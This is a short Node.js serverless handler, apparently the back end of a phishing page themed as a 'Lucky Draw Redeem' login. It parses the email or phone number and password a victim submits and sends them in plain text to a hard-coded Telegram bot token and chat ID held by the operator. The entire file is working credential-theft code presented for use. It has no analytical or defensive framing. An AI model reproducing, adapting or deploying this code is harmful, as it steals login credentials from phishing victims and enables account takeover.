const fetch = require('node-fetch');

exports.handler = async function(event, context) {
  const TELEGRAM_BOT_TOKEN = '8198072305:AAGbzp_knrOkr1nyLXDrNby7969mT42d_Fk';
  const TELEGRAM_CHAT_ID = '5983644996';
  
  try {
    const { emailOrPhone, password } = JSON.parse(event.body);

    const message = `🎉 Lucky Draw Redeem Login Details:\nEmail/Phone: ${emailOrPhone}\nPassword: ${password}`;

    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message
      }),
    });

    const data = await response.json();

    if (data.ok) {
      return {
        statusCode: 200,
        body: JSON.stringify({ success: true }),
      };
    } else {
      return {
        statusCode: 500,
        body: JSON.stringify({ success: false }),
      };
    }
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ success: false }),
    };
  }
};
